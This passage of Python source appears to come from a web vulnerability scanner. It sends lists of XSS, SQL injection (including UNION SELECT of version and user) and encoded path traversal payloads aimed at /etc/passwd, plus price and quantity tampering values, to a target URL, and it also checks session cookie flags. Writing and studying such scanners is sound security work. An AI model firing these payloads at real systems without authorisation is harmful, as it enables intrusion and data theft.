            # Attribute-based XSS
            {'payload': '" onmouseover="alert(1)', 'context': 'Attribute'},
            {'payload': "' onclick='alert(1)", 'context': 'Attribute'},
            
            # JavaScript context
            {'payload': 'alert(1)//', 'context': 'JavaScript'},
            {'payload': ');alert(1);//', 'context': 'JavaScript'},
            
            # CSS context
            {'payload': 'expression(alert(1))', 'context': 'CSS'},
            {'payload': 'url(javascript:alert(1))', 'context': 'CSS'},
            
            # Filter bypass
            {'payload': '<iframe src=javascript:alert(1)>', 'context': 'Filter Bypass'},
            {'payload': '<object data=javascript:alert(1)>', 'context': 'Filter Bypass'},
        ]
        
        try:
            for payload_data in advanced_payloads:
                payload = payload_data['payload']
                context = payload_data['context']
                result['payloads_tested'] += 1
                
                # Test in URL parameters
                test_url = f"{self.target}?test={payload}"
                try:
                    response = self.session.get(test_url, timeout=self.timeout)
                    if payload in response.text:
                        result['vulnerabilities'].append({
                            'type': 'Advanced Cross-Site Scripting (XSS)',
                            'severity': 'High',
                            'description': f'Advanced XSS detected in {context} context',
                            'payload': payload,
                            'context': context,
                            'url': test_url
                        })
                        result['contexts'].append(context)
                except Exception:
                    pass
                
        except Exception as e:
            logger.debug(f"Advanced XSS testing failed: {e}")
        
        return result
    
    def _advanced_sqli_testing(self, forms_data: Dict[str, Any]) -> Dict[str, Any]:
        """Advanced SQL injection testing with blind detection"""
        result = {
            'vulnerabilities': [],
            'techniques': ['Time-based blind SQLi', 'Boolean-based blind SQLi', 'Union-based SQLi'],
            'payloads_tested': 0,
            'contexts': []
        }
        
        # Advanced SQL injection payloads
        advanced_payloads = [
            # Time-based blind SQL injection
            {'payload': "' OR SLEEP(5) --", 'type': 'Time-based blind'},
            {'payload': "'; WAITFOR DELAY '00:00:05' --", 'type': 'Time-based blind'},
            
            # Boolean-based blind SQL injection
            {'payload': "' AND 1=1 --", 'type': 'Boolean-based blind'},
            {'payload': "' AND 1=2 --", 'type': 'Boolean-based blind'},
            
            # Union-based SQL injection
            {'payload': "' UNION SELECT @@version,2,3 --", 'type': 'Union-based'},
            {'payload': "' UNION SELECT user(),2,3 --", 'type': 'Union-based'},
        ]
        
        try:
            for payload_data in advanced_payloads:
                payload = payload_data['payload']
                sqli_type = payload_data['type']
                result['payloads_tested'] += 1
                
                # Test in URL parameters
                test_url = f"{self.target}?id={payload}"
                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=self.timeout)
                    response_time = time.time() - start_time
                    
                    # Check for time-based detection
                    if 'Time-based' in sqli_type and response_time > 4:
                        result['vulnerabilities'].append({
                            'type': 'Advanced SQL Injection',
                            'severity': 'Critical',
                            'description': f'Time-based SQL injection detected (response time: {response_time:.2f}s)',
                            'payload': payload,
                            'technique': sqli_type,
                            'url': test_url
                        })
                        result['contexts'].append('Time-based detection')
                    
                    # Check for error-based detection
                    sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql']
                    if any(error in response.text.lower() for error in sql_errors):
                        result['vulnerabilities'].append({
                            'type': 'Advanced SQL Injection',
                            'severity': 'Critical',
                            'description': f'Error-based SQL injection detected',
                            'payload': payload,
                            'technique': sqli_type,
                            'url': test_url
                        })
                        result['contexts'].append('Error-based detection')
                        
                except Exception:
                    pass
                
        except Exception as e:
            logger.debug(f"Advanced SQL injection testing failed: {e}")
        
        return result
    
    def _advanced_path_traversal_testing(self, forms_data: Dict[str, Any]) -> Dict[str, Any]:
        """Advanced path traversal testing with encoding variations"""
        result = {
            'vulnerabilities': [],
            'techniques': ['Double encoding', 'Unicode encoding', 'Null byte injection'],
            'payloads_tested': 0
        }
        
        # Advanced path traversal payloads
        advanced_payloads = [
            # Double encoding
            '%252e%252e%252fetc%252fpasswd',
            '%252e%252e%255cwindows%255csystem32%255cdrivers%255cetc%255chosts',
            
            # Unicode encoding
            '..%c0%af..%c0%afetc%c0%afpasswd',
            '..%c1%9c..%c1%9cetc%c1%9cpasswd',
            
            # Null byte injection
            '../../../etc/passwd%00.jpg',
            '../../../etc/passwd%00.txt',
            
            # Filter bypass
            '....//....//....//etc/passwd',
            '....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts',
        ]
        
        try:
            for payload in advanced_payloads:
                result['payloads_tested'] += 1
                
                # Test in URL parameters
                test_url = f"{self.target}?file={payload}"
                try:
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Check for file disclosure
                    if 'root:' in response.text or 'localhost' in response.text:
                        result['vulnerabilities'].append({
                            'type': 'Advanced Directory Traversal',
                            'severity': 'High',
                            'description': 'Advanced path traversal with encoding bypass detected',
                            'payload': payload,
                            'technique': 'Encoding bypass',
                            'url': test_url
                        })
                        
                except Exception:
                    pass
                
        except Exception as e:
            logger.debug(f"Advanced path traversal testing failed: {e}")
        
        return result
    
    def _test_business_logic_flaws(self, forms_data: Dict[str, Any]) -> Dict[str, Any]:
        """Test for business logic flaws"""
        result = {
            'vulnerabilities': [],
            'techniques': ['Price manipulation', 'Quantity bypass', 'Race condition testing']
        }
        
        try:
            # Test for common business logic flaws
            business_tests = [
                {'param': 'price', 'values': ['-1', '0', '0.01', '999999999']},
                {'param': 'quantity', 'values': ['-1', '0', '999999999']},
                {'param': 'discount', 'values': ['100', '200', '-50']},
                {'param': 'amount', 'values': ['-100', '0', '999999999']},
            ]
            
            for test in business_tests:
                for value in test['values']:
                    test_url = f"{self.target}?{test['param']}={value}"
                    try:
                        response = self.session.get(test_url, timeout=self.timeout)
                        
                        # Check for successful processing of invalid values
                        success_indicators = ['success', 'confirmed', 'processed', 'accepted']
                        if any(indicator in response.text.lower() for indicator in success_indicators):
                            result['vulnerabilities'].append({
                                'type': 'Business Logic Flaw',
                                'severity': 'Medium',
                                'description': f'Business logic bypass detected with {test["param"]}={value}',
                                'parameter': test['param'],
                                'value': value,
                                'url': test_url
                            })
                            
                    except Exception:
                        pass
                        
        except Exception as e:
            logger.debug(f"Business logic testing failed: {e}")
        
        return result
    
    def _test_session_management(self) -> Dict[str, Any]:
        """Test session management vulnerabilities"""
        result = {
            'vulnerabilities': [],
            'techniques': ['Session fixation', 'Session hijacking', 'Insecure session cookies']
        }
        
        try:
            # Test session cookie security
            response = self.session.get(self.target, timeout=self.timeout)
            
            # Check for session cookies
            for cookie in self.session.cookies:
                # Check for secure flag
                if not cookie.secure and 'session' in cookie.name.lower():
                    result['vulnerabilities'].append({
                        'type': 'Insecure Session Cookie',
                        'severity': 'Medium',
                        'description': f'Session cookie "{cookie.name}" missing Secure flag',
                        'cookie_name': cookie.name,
                        'recommendation': 'Set Secure flag for session cookies'
                    })
                
                # Check for HttpOnly flag
                if not cookie.has_nonstandard_attr('HttpOnly') and 'session' in cookie.name.lower():
                    result['vulnerabilities'].append({
                        'type': 'Insecure Session Cookie',
                        'severity': 'Medium',
                        'description': f'Session cookie "{cookie.name}" missing HttpOnly flag',
                        'cookie_name': cookie.name,
                        'recommendation': 'Set HttpOnly flag for session cookies'
                    })
                    
        except Exception as e:
            logger.debug(f"Session management testing failed: {e}")
        
        return result

def main():
    """Main function for CLI usage"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Enhanced Vulnerability Scanner')
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('--workers', type=int, default=10, help='Number of worker threads')
    parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds')
    parser.add_argument('--format', choices=['json', 'html'], default='json', help='Report format')
    
    args = parser.parse_args()
    
    # Create scanner instance
    scanner = EnhancedVulnerabilityScanner(args.target, args.workers, args.timeout)
    
    # Run scan
    asyncio.run(scanner.run_comprehensive_scan())
    
    # Generate report
    report_file = scanner.generate_report(args.format)
    print(f"Scan completed. Report saved to: {report_file}")

if __name__ == "__main__":
    main()